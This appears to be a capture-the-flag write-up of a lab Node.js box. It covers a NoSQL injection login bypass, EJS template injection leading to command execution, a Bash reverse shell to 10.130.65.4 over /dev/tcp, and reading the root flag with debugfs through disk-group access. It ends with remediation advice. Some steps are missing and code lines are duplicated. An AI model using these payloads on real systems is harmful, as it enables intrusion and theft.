Do Not Disturb - 2nd August

Objective

The objective of this Boot2Root challenge was to obtain both the user and root flags by identifying and chaining multiple vulnerabilities. During enumeration, two hints were provided:

  • "A session goes warm." This suggested that session handling or session hijacking could be involved.

  • "You have access you were never given, and so does he." This hinted that a user or process possessed unintended privileges, which later proved to be important during privilege escalation.

Step 1 – Initial Enumeration

I started by visiting the target website and manually inspecting the page source for hidden comments, JavaScript files, or exposed credentials. No useful information was found.

I then performed directory enumeration using Gobuster.

gobuster dir -u http://<TARGET_IP> -w /path/to/wordlist
gobuster dir -u http://<TARGET_IP> -w /path/to/wordlist

The scan revealed two interesting endpoints:

  • /staff → 403 Forbidden

  • /login → 401 Unauthorized

Although access was denied, the HTTP response indicated these pages existed.

While inspecting the application's source code, I noticed the backend was running Express.js, suggesting a Node.js application. This raised the possibility of NoSQL Injection against the authentication mechanism.

Step 2 – Bypassing Authentication using NoSQL Injection

The login request was modified by replacing the password parameter with a MongoDB operator.

username=attendant
password[$ne]=x
username=attendant
password[$ne]=x

The $ne (not equal) operator caused the authentication check to succeed, allowing me to bypass the login mechanism.

The server responded with a valid session cookie.

Step 3 – Session Hijacking

After obtaining the session cookie, I manually added it to my browser and revisited the previously inaccessible /staff page.

The application now treated me as an authenticated user, confirming that the session could be reused without additional validation.

Step 4 – Server-Side Template Injection (SSTI)

The staff page displayed the following template:

Dear <%= username %>, your Byte Lotus cabana is confirmed.
Dear <%= username %>, your Byte Lotus cabana is confirmed.

The syntax immediately identified the template engine as Embedded JavaScript (EJS).

To verify template injection, I supplied:

<%= 7 * 7 %>
<%= 7 * 7 %>

The server responded with:

49
49

This confirmed that arbitrary JavaScript expressions were being evaluated on the server.

Step 5 – Achieving Remote Code Execution

Since EJS executes JavaScript on the server, I leveraged Node.js built-in modules to execute operating system commands.

Enumerating users

<pre><%= process.getBuiltinModule('child_process').execSync('ls -la /home').toString() %></pre>
<pre><%= process.getBuiltinModule('child_process').execSync('ls -la /home').toString() %></pre>

This revealed the available user directories.

Next, I retrieved the user flag.

<pre><%= process.getBuiltinModule('child_process').execSync('cat /home/poolside/user.txt').toString() %></pre>
<pre><%= process.getBuiltinModule('child_process').execSync('cat /home/poolside/user.txt').toString() %></pre>

The contents of user.txt were successfully displayed, giving the user flag.

Step 6 – Obtaining a Reverse Shell

To gain interactive access, I executed a Bash reverse shell from within the EJS template.

<% process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.130.65.4/4321 0>&1'"); %>
<% process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.130.65.4/4321 0>&1'"); %>

A listener was already waiting on my attacking machine, resulting in a reverse shell as the poolside user.

Attempting passwordless sudo:

Since sudo was unavailable, the disk group membership became the primary privilege escalation vector.

 

Step 9 – Verifying Disk Access

First, I identified the available block devices.

process.getBuiltinModule('child_process').execSync(
'lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINTS'
).toString()
process.getBuiltinModule('child_process').execSync(
'lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINTS'
).toString()

The root filesystem resided on:

/dev/nvme0n1p1
/dev/nvme0n1p1

I then confirmed that members of the disk group had read access.

process.getBuiltinModule('child_process').execSync(
"ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true"
).toString()
process.getBuiltinModule('child_process').execSync(
"ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true"
).toString()

The output showed:

brw-rw---- root disk /dev/nvme0n1
brw-rw---- root disk /dev/nvme0n1p1
brw-rw---- root disk /dev/nvme0n1
brw-rw---- root disk /dev/nvme0n1p1

Because the process belonged to the disk group, it could directly read the underlying filesystem.

Step 10 – Reading the Root Flag

Using debugfs, I accessed the root filesystem without requiring root privileges.

process.getBuiltinModule('child_process').execSync(
"/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null"
).toString()
process.getBuiltinModule('child_process').execSync(
"/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null"
).toString()

The command successfully returned the contents of:

/root/root.txt
/root/root.txt

which completed the challenge.

Attack Chain Summary

  1. Enumerated the web application using Gobuster.

  2. Identified an Express.js backend.

  3. Bypassed authentication using a MongoDB NoSQL Injection.

  4. Reused the returned session cookie to access restricted pages.

  5. Identified an EJS Server-Side Template Injection.

  6. Leveraged SSTI to achieve Remote Code Execution.

  7. Obtained a reverse shell as the poolside user.

  8. Enumerated local processes and discovered an exposed Node.js Inspector on port 9229.

  9. Connected to the debugger and executed commands as the pipelinesvc user.

  10. Identified membership in the disk group.

  11. Used direct disk access with debugfs to read /root/root.txt.

  12. Successfully obtained the root flag.

Key Vulnerabilities

  • NoSQL Injection authentication bypass

  • Session hijacking through reusable session cookies

  • Server-Side Template Injection (EJS)

  • Remote Code Execution

  • Exposed Node.js Inspector service

  • Excessive privileges through disk group membership

  • Direct filesystem access using debugfs

Remediation

  • Validate and sanitize all user input to prevent NoSQL Injection.
  • Use parameterized queries or secure ORM/ODM practices instead of directly using user input in database queries.
  • Implement secure session management with HttpOnly, Secure, and SameSite cookies, and regenerate session IDs after login.
  • Never render user-controlled input as EJS templates to prevent Server-Side Template Injection (SSTI).
  • Disable access to dangerous modules such as child_process and avoid executing system commands from the application.
  • Disable the Node.js Inspector (port 9229) in production or restrict access to trusted administrators only.
  • Apply the principle of least privilege by removing unnecessary group memberships such as the disk group.
  • Restrict access to block devices (e.g., /dev/nvme0n1p1) to prevent direct filesystem access.
  • Regularly patch and harden the operating system and application dependencies.
  • Monitor and log suspicious authentication attempts, template injection payloads, debugger access, and unusual process execution.
